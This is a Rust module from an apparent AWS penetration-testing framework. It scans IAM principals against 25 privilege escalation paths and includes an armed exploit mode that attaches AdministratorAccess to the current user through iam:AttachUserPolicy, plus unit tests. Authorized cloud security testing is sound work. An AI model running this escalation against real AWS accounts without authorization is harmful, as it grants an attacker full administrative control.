//! iam__privesc_scan — IAM privilege escalation path finder (25 checks).
//!
//! Reads effective permissions from the `iam_permissions` session cache
//! (populated by `iam__enum_permissions`) and evaluates all 25 known IAM
//! privilege escalation paths against the target principal(s).
//!
//! CLI args:
//!   --scan-only              report vulnerable paths, do not exploit (default safe mode)
//!   --exploit                actually execute the escalation (requires ctx.armed == true)
//!   --principal <arn>        target a specific principal ARN
//!   --all                    scan all principals in the iam_permissions cache

use anyhow::Context as _;
use colored::Colorize;
use comfy_table::{Cell, Table};

use crate::iam::policy::EffectivePermissions;
use crate::iam::privesc::{scan_principal, ScanResult};
use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let scan_only = args.contains(&"--scan-only");
    let exploit = args.contains(&"--exploit");
    let enumerate_all = args.contains(&"--all");

    let principal_arg: Option<&str> = {
        let pos = args.iter().position(|&a| a == "--principal");
        pos.and_then(|i| args.get(i + 1).copied())
    };

    // Default to scan-only when neither flag is supplied
    let do_scan_only = scan_only || !exploit;
    let do_exploit = exploit;

    if do_exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires the session to be armed (ctx.armed == true). \
             Pass --armed when starting pacu to enable."
                .red()
                .bold()
        );
        return Ok(());
    }

    // ── Prerequisite check: iam_permissions must be populated ──────────────
    let permissions_map = load_permissions_map(ctx).await;
    if permissions_map.is_empty() {
        println!(
            "{}",
            "Run `iam__enum_permissions` first to populate effective permissions cache.".yellow()
        );
        return Ok(());
    }

    // ── Resolve which principals to scan ────────────────────────────────────
    let targets: Vec<(String, EffectivePermissions)> = if enumerate_all {
        permissions_map.into_iter().collect()
    } else if let Some(arn) = principal_arg {
        match permissions_map.get(arn) {
            Some(perms) => vec![(arn.to_owned(), perms.clone())],
            None => {
                eprintln!(
                    "{} Principal '{}' not found in iam_permissions cache. \
                     Run iam__enum_permissions --principal {} first.",
                    "Error:".red().bold(),
                    arn,
                    arn
                );
                return Ok(());
            }
        }
    } else {
        // Default: pick the first (and usually only) principal
        if let Some((arn, perms)) = permissions_map.into_iter().next() {
            vec![(arn, perms)]
        } else {
            println!(
                "{}",
                "Run `iam__enum_permissions` first to populate effective permissions cache.".yellow()
            );
            return Ok(());
        }
    };

    // ── Scan each target ────────────────────────────────────────────────────
    let mut all_results: Vec<ScanResult> = Vec::new();
    for (arn, perms) in targets {
        let result = scan_principal(arn, &perms);
        all_results.push(result);
    }

    // ── Display scan results ────────────────────────────────────────────────
    for result in &all_results {
        display_scan_result(result);
    }

    // ── Exploit mode ────────────────────────────────────────────────────────
    if do_exploit {
        // Only suppress the scan report if --exploit was explicitly requested
        // without --scan-only; otherwise both are shown.
        let _ = do_scan_only; // suppress unused warning
        exploit_mode(ctx, &all_results).await?;
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Load iam_permissions from session DB
// ---------------------------------------------------------------------------

async fn load_permissions_map(
    ctx: &AwsContext,
) -> std::collections::HashMap<String, EffectivePermissions> {
    let Some(pool) = &ctx.db_pool else {
        return std::collections::HashMap::new();
    };

    let Ok(Some(sess)) = crate::db::get_active_session(pool).await else {
        return std::collections::HashMap::new();
    };

    if sess.iam_permissions == "{}" {
        return std::collections::HashMap::new();
    }

    serde_json::from_str(&sess.iam_permissions).unwrap_or_default()
}

// ---------------------------------------------------------------------------
// Display helpers
// ---------------------------------------------------------------------------

fn display_scan_result(result: &ScanResult) {
    println!(
        "\n{} {}",
        "[ESCALATE] iam__privesc_scan results for".cyan().bold(),
        result.principal_arn.yellow()
    );

    if result.vulnerable_paths.is_empty() {
        println!(
            "{}",
            format!(
                "No privilege escalation paths found for {}.",
                result.principal_arn
            )
            .green()
        );
        return;
    }

    let mut table = Table::new();
    table.set_header(vec![
        Cell::new("ID"),
        Cell::new("Path"),
        Cell::new("Required Permissions"),
        Cell::new("Detection"),
    ]);

    for path in &result.vulnerable_paths {
        let perms_str = path.required_perms.join(", ");
        // Truncate long strings for table readability
        let perms_display = if perms_str.len() > 38 {
            format!("{}…", &perms_str[..37])
        } else {
            perms_str
        };
        let note_display = if path.detection_note.len() > 48 {
            format!("{}…", &path.detection_note[..47])
        } else {
            path.detection_note.to_owned()
        };

        table.add_row(vec![
            Cell::new(path.id.to_string()),
            Cell::new(path.name),
            Cell::new(perms_display),
            Cell::new(note_display),
        ]);
    }

    println!("{table}");
    println!(
        "{}",
        format!(
            "{} vulnerable path(s) found for {}",
            result.vulnerable_paths.len(),
            result.principal_arn
        )
        .yellow()
        .bold()
    );
}

// ---------------------------------------------------------------------------
// Exploit mode
// ---------------------------------------------------------------------------

async fn exploit_mode(ctx: &AwsContext, results: &[ScanResult]) -> anyhow::Result<()> {
    println!(
        "\n{}",
        "⚠️  EXPLOIT MODE ACTIVE. This will attempt REAL AWS API calls that MODIFY state."
            .red()
            .bold()
    );
    println!(
        "{}",
        "    CloudTrail will record these actions. Only proceed if you have explicit authorization."
            .red()
    );
    println!(
        "{}",
        "    Press Ctrl+C within 5 seconds to abort...".red()
    );

    tokio::time::sleep(std::time::Duration::from_secs(5)).await;

    let iam = aws_sdk_iam::Client::new(&ctx.sdk_config);

    for result in results {
        if result.vulnerable_paths.is_empty() {
            continue;
        }

        println!(
            "\n{} {}",
            "Exploiting paths for:".red().bold(),
            result.principal_arn.yellow()
        );

        for path in &result.vulnerable_paths {
            match path.id {
                7 => {
                    // AttachUserPolicy — attach AdministratorAccess to the current user
                    exploit_attach_user_policy(ctx, &iam, &result.principal_arn).await?;
                }
                _ => {
                    println!(
                        "  {} [{}] {} — exploit not yet implemented.",
                        "NOTICE".yellow(),
                        path.id,
                        path.name
                    );
                    println!(
                        "    {}",
                        format!("Exploit steps: {}", path.detection_note).dimmed()
                    );
                }
            }
        }
    }

    Ok(())
}

/// Execute (or dry-run) path 7: AttachUserPolicy with AdministratorAccess.
async fn exploit_attach_user_policy(
    ctx: &AwsContext,
    iam: &aws_sdk_iam::Client,
    principal_arn: &str,
) -> anyhow::Result<()> {
    const ADMIN_POLICY_ARN: &str = "arn:aws:iam::aws:policy/AdministratorAccess";

    // Extract user name from ARN: arn:aws:iam::ACCOUNT:user/USERNAME
    let user_name = principal_arn
        .rsplit('/')
        .next()
        .ok_or_else(|| anyhow::anyhow!("Cannot extract user name from ARN: {principal_arn}"))?;

    if !ctx.armed {
        println!(
            "  {} Would call: iam:AttachUserPolicy on {} with AdministratorAccess",
            "[DRY-RUN]".cyan().bold(),
            principal_arn
        );
        return Ok(());
    }

    println!(
        "  {} iam:AttachUserPolicy — attaching {} to {}",
        "EXEC".red().bold(),
        ADMIN_POLICY_ARN,
        principal_arn
    );

    iam.attach_user_policy()
        .user_name(user_name)
        .policy_arn(ADMIN_POLICY_ARN)
        .send()
        .await
        .context("iam:AttachUserPolicy failed")?;

    println!(
        "  {} AdministratorAccess attached to {}",
        "OK".green().bold(),
        principal_arn
    );

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "iam__privesc_scan",
            author: "lancer-pacu",
            category: "ESCALATE",
            one_liner: "IAM privilege escalation path finder (25 checks). --scan-only to report; --exploit with --armed to execute.",
            services: &["IAM", "STS", "EC2", "Lambda", "Glue", "CloudFormation", "DataPipeline"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use super::*;
    use crate::iam::privesc::PRIVESC_PATHS;
    use crate::module::Module;

    /// Module is registered in the inventory.
    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "iam__privesc_scan");
        assert!(found, "iam__privesc_scan not found in inventory");
    }

    /// Category is ESCALATE.
    #[test]
    fn module_category_is_escalate() {
        let module = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "iam__privesc_scan")
            .expect("iam__privesc_scan not found");
        assert_eq!(module.info.category, "ESCALATE");
    }

    /// Inventory has at least 5 modules after this module is added.
    #[test]
    fn inventory_has_at_least_five_modules() {
        let count = inventory::iter::<Module>.into_iter().count();
        assert!(
            count >= 5,
            "expected at least 5 modules in inventory, found {count}"
        );
    }

    /// scan_principal with AttachUserPolicy permission finds path 7.
    #[test]
    fn scan_finds_attach_user_policy() {
        let effective = EffectivePermissions {
            allow: vec!["iam:attachuserpolicy".to_owned()],
            deny: vec![],
        };
        let result = scan_principal(
            "arn:aws:iam::123456789012:user/alice".to_owned(),
            &effective,
        );
        let ids: Vec<u8> = result.vulnerable_paths.iter().map(|p| p.id).collect();
        assert!(ids.contains(&7), "path 7 should be found: {ids:?}");
    }

    /// scan_principal with no permissions finds nothing.
    #[test]
    fn scan_empty_permissions_no_paths() {
        let effective = EffectivePermissions {
            allow: vec![],
            deny: vec![],
        };
        let result = scan_principal(
            "arn:aws:iam::123456789012:user/nobody".to_owned(),
            &effective,
        );
        assert!(result.vulnerable_paths.is_empty());
    }

    /// PRIVESC_PATHS has exactly 25 entries (regression guard).
    #[test]
    fn exactly_25_privesc_paths_via_module() {
        assert_eq!(PRIVESC_PATHS.len(), 25);
    }
}
